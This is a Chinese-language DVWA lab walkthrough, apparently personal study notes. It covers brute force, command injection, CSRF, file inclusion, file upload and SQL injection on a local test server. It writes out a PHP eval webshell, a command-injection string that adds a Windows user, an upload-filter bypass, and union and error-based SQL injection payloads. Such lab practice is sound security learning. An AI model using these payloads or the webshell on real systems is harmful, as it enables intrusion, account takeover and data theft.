踩过坑：
以下均在vmware中完成，环境为windows10 21H1(OS内部版本19043.928)中完成。
搭建完成dvwa后，创建db
设置user:admin   password:password
## 1.暴力破解
抓这种本地搭建的包，不能用127.要用ip地址
![[Pasted image 20250318235354.png]]
输入错误密码，会有bp截包history
![[Pasted image 20250318235531.png]]
右键进入intruder,然后attack type这里选择sniper

![[Pasted image 20250318235802.png]]
payload这里选择导入密码本，
这里为了加快进度自己最简单写了一个pwd.txt这种
![[Pasted image 20250319000037.png]]
导入之后就可以直接start attack
之后就可以看到一些信息了，分析为暴力破解成功。可以看到正确登陆成功的与其他失败的有所不同。
![[Pasted image 20250319000248.png]]

## 2.命令注入
可以通过直接ping 一下本地获得信息
![[Pasted image 20250319181654.png]]
在设置等级为low时
对于C:\PhpStudy\phpstudy_pro\WWW\DVWA-master\vulnerabilities\exec\source下的low.php文件分析
`<?php`

`if( isset( $_POST[ 'Submit' ]  ) ) {`
	`// Get input`
	`$target = $_REQUEST[ 'ip' ];`

	``// Determine OS and execute the ping command.``
	``if( stristr( php_uname( 's' ), 'Windows NT' ) ) {``
		``// Windows``
		``$cmd = shell_exec( 'ping  ' . $target );``
                                ``$cmd = iconv("GBK", "UTF-8//IGNORE", $cmd); // 添加这一行``
	``}``
	``else {``
		``// *nix``
		``$cmd = shell_exec( 'ping  -c 4 ' . $target );``
	``}``

	``// Feedback for the end user``
	``$html .= "<pre>{$cmd}</pre>";``
`}`

`?>`
### 代码分析

php

复制

`$target = $_REQUEST[ 'ip' ]; // ... $cmd = shell_exec( 'ping  ' . $target ); $cmd = iconv("GBK", "UTF-8//IGNORE", $cmd); // 转换编码`

关键问题点:

1. **没有任何输入验证或过滤** - 直接将用户输入拼接到命令中
2. **使用shell_exec执行命令** - 允许执行任意系统命令

### 漏洞利用方法

#### 基本命令注入

可以使用以下字符来连接额外的命令:

- `&` - 执行前一个命令，然后执行后一个命令
- `&&` - 前一个命令成功后执行后一个命令
- `|` - 管道，将前一个命令的输出作为后一个命令的输入
- `;` - 命令分隔符
添加127.0.0.1 & net user pengyu /add
然后在命令行中就可以看到信息了
![[Pasted image 20250319182422.png]]
还可以在ping 完成之后ipconfig查看信息
![[Pasted image 20250319182532.png]]

## 3.跨站请求伪造
### 分析low下的代码
从源代码可以看出这里只是对用户输入的两个密码进行判断，看是否相等。不相等就提示密码不匹配。
相等的话，查看有没有设置数据库连接的全局变量和其是否为一个对象。如果是的话，用mysqli_real_escape_string（）函数去转义一些字符，如果不是的话输出错误。是同一个对象的话，再用md5进行加密，再更新数据库。
然后尝试一下当密码相等或者不等的时候的差别
分别输入http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=111&password_conf=1234&Change=Change#和
![[Pasted image 20250319110842.png]]
和http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=111&password_conf=111&Change=Change#
![[Pasted image 20250319111002.png]]

### 分析middle下的代码

分析middle.php代码
Middle类型的代码在Low级别的基础上，加上了对用户请求头的中的Referer字段进行验证
即用户的请求头中的Referer字段必须包含了服务器的名字
我们随便抓一个包，然后bp抓包看看
![[Pasted image 20250319211044.png]]
可以发现Referer字段
如果直接输出URL的时候，尝试修改密码并不能成功，是因为没有包含referer
所以自己可以加一个referer,伪造请求
在bp的repeater中查看request,在referer中构造加入本地地址，然后send可以伪造出请求.如下图
![[Pasted image 20250319211419.png]]
可以看到在response里面可以看到password changed 成功了。这说明伪造请求成功。

## 4.文件包含
首先需要满足：在dvwa的Setup Check中
`PHP`
`PHP version: 7.3.4`
`PHP function display_errors: Enabled`
`PHP function display_startup_errors: Enabled`
`PHP function allow_url_include: Enabled`
`PHP function allow_url_fopen: Enabled`
`PHP module gd: Installed`
`PHP module mysql: Installed`
`PHP module pdo_mysql: Installed`

具体参看了其他教程，注意的是修改了对应的php.ini后需要对apache重启，否则不生效
### low
可以分别查看file1,file2,file3的内容，比如file3的内容以及**URL信息后缀**
![[Pasted image 20250319214339.png]]
以上可知：通过page=xxx来打开相应的文件
尝试包含一个不存在的本地文件nihao.php,提示error
![[Pasted image 20250320151251.png]]
同理尝试phpinfo.php,发现error,说明服务器类型不是linux
![[Pasted image 20250320151411.png]]
同理尝试/etc/shadow,报错，说明不是linux
通过上述路径可以发现服务器的绝对路径就是 C:\PhpStudy\phpstudy_pro\WWW\
![[Pasted image 20250320154300.png]]
用服务器绝对路径进行伪造，可以成功读取到服务器的php.ini的文件内容，如上图。
也可以成功读到phpinfo.php,这里直接把后面改了

接下来用相对地址，输入http://192.168.153.139/DVWA-master/vulnerabilities/fi/?page=../../php.ini
可以发现可以看到php.ini
![[Pasted image 20250320201217.png]]
配置文件中Magic_quote_gpc选项为off。在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，我们可以在文件名中使用%00进行截断
http://192.168.153.139/DVWA-master/vulnerabilities/fi/?page=../../php.ini%0012.php 的效果与上面的完全一致
![[Pasted image 20250320201516.png]]

### 用一句话木马
在网站根目录下创建muma.php文件
muma.php的内容如下：
```
`<?php`
`ini_set('display_errors', 1);`
`error_reporting(E_ALL);`

`if (isset($_POST['key'])) {`
    `@eval($_POST['key']);`
    `echo "Command executed successfully.";`
`} else {`
    `echo "No command received.";`
`}`
`?>`
```

然后在浏览器地址上输入http://192.168.153.139/DVWA-master/vulnerabilities/fi/?page=http://192.168.153.139/muma.php
![[Pasted image 20250320202523.png]]
在command injection中执行那个|| dir C:\PhpStudy\phpstudy_pro\WWW,可以看到刚写的muma.php
![[Pasted image 20250320202839.png]]

尝试用中国菜刀未果，好像软件有问题，
后用中国蚁剑成功，构造添加数据，如下图：
![[Pasted image 20250320211929.png]]
相应密码为key,选择连接类型为php.
然后测试连接成功。可以成功进入文件列表
![[Pasted image 20250320212148.png]]
连接成功获得webshell权限，此时我们可以对目标（此处为本地机器）进行任意操作，如：删除文件，添加脚本文件，查看文件等等。  

## 5.文件上传
其实在刚才文件包含的时候我就用一句话木马的方法演示了进入目的机的webshell权限
这个文件上传的low级别是一样的，这里我就不再不写了。不过middle级别是不一样的
### middle
在C:\PhpStudy\phpstudy_pro\WWW\DVWA-master\vulnerabilities\upload\source下分析middle.php代码
![[Pasted image 20250320213411.png]]
分析源码，可以看到代码里对上传的类型和大小做了限制,只允许上传格式为`jpeg`和`png`格式,上传大小为小于`100000`字节。
所以这是上传一个php文件是不行的
还是将muma.php文件的属性改为.jpeg
然后伺机上传，这时通过bp抓包可以看到如下信息：
![[Pasted image 20250320214306.png]]
可以在C:\PhpStudy\phpstudy_pro\WWW\DVWA-master\hackable\uploads 中看到上传到的.jpeg的文件
![[Pasted image 20250321105637.png]]
然后在bp中抓包中找到Content-Disposition字段，然后修改为muma.php,forword就可以看到web的response
![[Pasted image 20250321110618.png]]
然后就可以在本地的uploads中找到上传成功的muma.php
![[Pasted image 20250321110702.png]]
接着跟上面的一样用一句话木马进行连接，实现服务器文件管理
![[Pasted image 20250321111150.png]]
连接成功，进入文件管理：
![[Pasted image 20250321111229.png]]

## 6.SQL注入

### SQL injection -low
正常提交payload为1
![[Pasted image 20250321155552.png]]
联合查询：
```
1 and 1=1#
1 and 1=2#
```
均返回正常
![[Pasted image 20250321155835.png]]
得出结论：
注入类型不是数字
```
1' and 1=1#     //返回正常
1' and 1=2#     //返回异常
```
得出结论：注入类型为字符，单引号闭合
接下来猜测并进行字符判断
1' order by 2#      //猜测是2个字段，直接从2开始。
1' order by 3#     //返回失败
![[Pasted image 20250321171019.png]]

==猜测正确，字段为2==
 #### 获取数据库
```
 1' UNION SELECT 1,database() from information_schema.schemata#    //
```
![[Pasted image 20250321171226.png]]
可以看到数据库为dvwa
`1' UNION SELECT 1,table_name from information_schema.tables where table_schema='dvwa'#`
查询表名
![[Pasted image 20250321172230.png]]

> [!NOTE] 遇到的问题
> 如果在使用查询`1' UNION SELECT 1,table_name from information_schema.tables where table_schema='dvwa'`时出现错误提示`Illegal mix of collations for operation 'UNION'`，通常是**因为UNION操作中的列类型或校对集（collation）不匹配**，可以使用强制类型转换，将 `table_name` 转换为与原始查询列相同的类型（例如字符串），确保校对集一致。
> 修改后的语句
> `1' UNION SELECT 1, CAST(table_name AS CHAR) FROM information_schema.tables WHERE table_schema='dvwa'#`

查询到有两个表 guestbook、users
查询users
```
1' UNION SELECT 1, CAST(column_name AS CHAR) COLLATE utf8_general_ci FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users'#        //这里选择强制类型转换
```
![[Pasted image 20250321174342.png]]
可以看到列名：password,user_id,first-id,last_name等等

获取数据：1'`` UNION SELECT 1,group_concat(user,0x3a,avatar) from users#  


![[Pasted image 20250321193059.png]]
可以知道
user:admin对应的avatar:/dvwa/hackable/users/admin.jpg，以此类推。
#### error注入
`1' and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)#`
获取表名，如下图
![[Pasted image 20250321193746.png]]
获取列名
`1' and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),0x7e),1)#`
![[Pasted image 20250321193842.png]]
获取数据
`1' and updatexml(1,concat(0x7e,(SELECT group_concat(user,0x3a,avatar) from users limit 0,1),0x7e),1)#`
![[Pasted image 20250321194005.png]]


### SQL injection -middle
![[Pasted image 20250321194959.png]]

这个时候URL没有参数，可能只能以post的方式查看注入结果
掏出bp
先把上面那个id=1的post方式截个包
![[Pasted image 20250321195342.png]]
以repeater的方式，`post id=1 and 1=1#`
如下图，reponse 说明正常
![[Pasted image 20250321200026.png]]
`post id= 1 and 1=2#` 
异常，说明是注入类型为数字。这里跟上面同理不作展示
#### 获取数据库：
payload 如下
![[Pasted image 20250321200531.png]]

获取表名，出错
![[Pasted image 20250321200728.png]]
经查阅资料，问题在于**要进行字符转16进制**
1 UNION SELECT 1,table_name from information_schema.tables where table_schema=0x64767761#

> [!NOTE] 问题
> 如  reponse是Illegal mix of collations for operation 'UNION'，
> 在Middle级别，数据库可能启用了更严格的校对集（collation）检查，导致UNION查询中的列类型或校对集不匹配。例如：
  - 原始查询的列类型可能与UNION查询的列类型不兼容。
  - `information_schema.tables`表的`table_name`字段可能使用不同的校对集（如`utf8_bin`），而原始查询的列可能使用`utf8_general_ci`。
  
如果Middle级别启用了输入过滤（如禁止`COLLATE`关键字），可以尝试使用十六进制编码绕过：
`id=1 UNION SELECT 1, HEX(table_name) FROM information_schema.tables WHERE table_schema=0x64767761#&Submit=Submit`

![[Pasted image 20250321201433.png]]

#### error 注入
注入命令同low,
![[Pasted image 20250321202126.png]]
#### 总结
分析middle.php
##### **代码功能概述**

1. **功能**：该代码用于处理用户提交的 `id` 参数，查询 `users` 表中对应的 `first_name` 和 `last_name`。
2. **数据库类型**：支持 MySQL 和 SQLite（根据 `$_DVWA['SQLI_DB']` 配置）。
3. **安全措施**：
    - 使用 `mysqli_real_escape_string` 对用户输入的 `id` 进行转义。
    - 输出错误信息时隐藏数据库细节（通过 `die` 和 `pre` 标签）。

---

##### **安全漏洞分析**

###### **1. 未正确过滤数字型输入**

- **代码片段**：
    
    <PHP>
    
    ```
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    ```
    
- **问题**：
    - 虽然使用 `mysqli_real_escape_string` 转义了输入，但 `$id` 在 SQL 查询中 **未用引号包裹**（例如 `WHERE user_id = '$id'`），导致输入被当作数字处理。
    - 攻击者可利用 **数字型 SQL 注入**，绕过转义直接注入恶意代码。

###### **2. 漏洞验证**

- **攻击示例**： 假设用户提交 `id=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=0x64767761#`：
    
    <SQL>
    
    ```
    SELECT first_name, last_name FROM users WHERE user_id = 1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=0x64767761#;
    ```
    
    - `0x64767761` 是 `dvwa` 的十六进制编码，用于绕过引号过滤。
    - 由于 `$id` 未包裹引号，注入的 `UNION` 语句会被执行。

